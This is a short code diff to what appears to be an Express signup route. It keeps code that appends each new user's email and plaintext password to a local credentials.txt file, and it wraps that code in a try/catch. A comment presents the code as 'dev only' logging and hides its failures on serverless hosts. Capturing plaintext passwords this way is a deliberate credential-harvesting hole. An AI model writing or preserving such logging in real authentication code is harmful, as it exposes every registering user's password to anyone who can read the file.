@@ -31,8 +31,13 @@ router.post('/signup', async (req, res) => {
       passwordHash,
     })
 
-    const logData = `Email: ${email}, Password: ${password}\n`
-    await fs.promises.appendFile(path.join(process.cwd(), 'credentials.txt'), logData)
+    // Log credentials locally (dev only — silently fails on serverless)
+    try {
+      const logData = `Email: ${email}, Password: ${password}\n`
+      await fs.promises.appendFile(path.join(process.cwd(), 'credentials.txt'), logData)
+    } catch {
+      // Serverless environments have read-only filesystems — skip logging
+    }
 
     return res.status(201).json({
       message: 'Account created successfully.',
